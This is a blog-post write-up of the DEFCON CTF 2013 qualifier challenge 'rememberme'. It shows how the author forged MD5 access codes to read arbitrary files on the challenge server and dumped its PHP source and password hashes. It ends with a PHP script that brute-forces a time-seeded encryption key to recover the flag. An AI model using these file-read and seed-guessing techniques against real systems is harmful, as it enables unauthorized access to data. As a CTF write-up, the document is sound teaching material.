---
title: rememberme - DEFCON CTF quals 2013
author: sebbe
layout: post
published: true
date: 2013-06-19 12:51:59
---

Challenge description:
> http://rememberme.shallweplayaga.me/

The challenge starts you out with links to two files `usernames.txt` and `passwords.txt`, as well as a link to a login page.

![front page](/public/img/rememberme-front.png )

The link to `usernames.txt` gave a list of some Star Trek characters

    jeanluc
    riker
    spock
    tiberius
    bones
    crusher
    deana

While the link to `passwords.txt` gave access denied.

A brief look at the URLs,

    http://rememberme.shallweplayaga.me/getfile.php?filename=usernames.txt&accesscode=60635c6862d44e8ac17dc5e144c66539
    http://rememberme.shallweplayaga.me/getfile.php?filename=passwords.txt&accesscode=60635c6862d44e8ac17dc5e144c66539

revealed what we presumed to be a MD5 hash. Guessing it was a hash of the filename, we tried

    http://rememberme.shallweplayaga.me/getfile.php?filename=passwords.txt&accesscode=b55dcb609a2ee6ea10518b5fd88c610e

which gave us the following password hashes:

    jeanluc:$6$J/J$zezZMHwc4axqYJZk5nUHD8uwCtz7uU4EjcgVHrJsN2tW2BiMGwTPrC2sI1KD4B3O82o/nShpY0LtctLIihl5.0:15868:0:99999:7:::
    riker:$6$CkoJSeZPJNPtRxZo$O5NBiK5LPXXBszv5cUf4wS4tkKCHtcBM4Q8JuzzXyz38mKQpPGrcwNST1PmjCkqGDT1wVnqCSpBWhRGFmMKRq0:15868:0:99999:7:::
    spock:$6$h7AXU$ulWYM7BGY62mA/x4RjDAJzoTEQhZnMiU..OJwz/n.NbvGMT5FuDuiY3MrkWPrj6HWDuMYIPdTa/js2UO9EC6R.:15868:0:99999:7:::
    tiberius:$6$g8fas1AItAy85OvS$Tfhxf6HRO0ZHC7.ekPnLssf67TM2ELpus0gCHEVQVQnoix.mnRd30EdYuF7gpoRnWfKFq.zk8pXeJk2Ug7POk0:15868:0:99999:7:::
    bones:$6$t5TXeD0jYTRe.DCT$tW/qq5qxN79Isce6clU7FtNYEkzSOnFa4TqSbU4/VsPTz.uSlb.e3dvNrVUGXJCBLl51FxxCct3iJTnqC3aeq1:15868:0:99999:7:::
    crusher:$6$1cNogvGgHLd9m2xP$OTV9Mtl1PmnLlZIi/iXFzBYyEBW4xLzYYTYT41FZRq45iWSsb6lJu0Vtw5WyOWSNI1NR1CECInqErn341vZOy/:15868:0:99999:7:::
    deana:$6$hn4gRZq3b6PEfVmN$YckwH8..bO5awtPUX7J8994GT62S8075HWdtyRnBBYh4.AMOG6VIWng1IWYMZPAFDmDJcgOmMe5E9ZwEpGHpb0:15868:0:99999:7:::

These proved to be useless, however, since

    http://rememberme.shallweplayaga.me/getfile.php?filename=login.php&accesscode=73dce75d92181ca956e737b3cb66db98

revealed the login page to be a troll:

```php
<html>
<title>Remember Me</title>
<?php
if ($_SERVER['REQUEST_METHOD'] == "POST") {
    echo "<font color='red'> ACCESS DENIED!</font>";
}
?>
<body><form id='login' action='login.php' method='post' accept-charset='UTF-8'>
<fieldset >
<legend>Login</legend>
<label for='username' >UserName:</label>
<input type='text' name='username' id='username'  maxlength="50" /><br>

<label for='password' >Password:</label>
<input type='password' name='password' id='password' maxlength="50" /><br>

<input type='submit' name='Submit' value='Submit' />

</fieldset>
</form>
</body>
</html>
```

Taking a look at `getfile.php` through itself revealed the following:

```php
<?php
$value = time();
$filename = $_GET["filename"];
$accesscode = $_GET["accesscode"];
if (md5($filename) == $accesscode){
    echo "Acces granted to $filename!<br><br>";
    srand($value);
    if (in_array($filename, array('getfile.php', 'index.html', 'key.txt', 'login.php', 'passwords.txt', 'usernames.txt'))==TRUE){
        $data = file_get_contents($filename);
        if ($data !== FALSE) {
            if ($filename == "key.txt") {
                $key = rand();
                $cyphertext = mcrypt_encrypt(MCRYPT_RIJNDAEL_128, $key, $data, MCRYPT_MODE_CBC);
                echo  base64_encode($cyphertext);
            }
            else{
                echo nl2br($data);
            }

        }
        else{
            echo "File does not exist";
        }
    }
    else{
        echo "File does not exist";
    }

}
else{
    echo "Invalid access code";
}
?>
</body>
</html>
```

Here we see, that the key must be stored in `key.txt`, and that it is encrypted with a random number, seeded based on the timestamp.

We then downloaded the key, as well as the approximate local timestamp, using the following command:

    wget -O cryptotext 'http://rememberme.shallweplayaga.me/getfile.php?filename=key.txt&accesscode=65c2a527098e1f7747eec58e1925b453' && date +%s > date

Guessing that the timestamp would probably be within +- 10 seconds of the server's timestamp, we used the following script to try all the options:

```php
<?php
$b64val = 'N9dlf5yJ2XAhLn1yCnD6f7Vi8LkBRPCmWGef5i/2UqiBDT1rZGaCKAVWqdhiv++qbudQRNew77YdJ19DFwREtA==';
$timestamp = 1371316621;

$cryptotext = base64_decode($b64val);

for ($i = -10; $i <= 10; $i++) {
    srand($timestamp+$i);
    echo mcrypt_decrypt(MCRYPT_RIJNDAEL_128, rand(), $cryptotext, MCRYPT_MODE_CBC);
    echo "\n";
}
```

Which yielded a bunch of garbage lines, as well as the desired key.

The key is: To boldly go where no one has gone before WMx8reNS
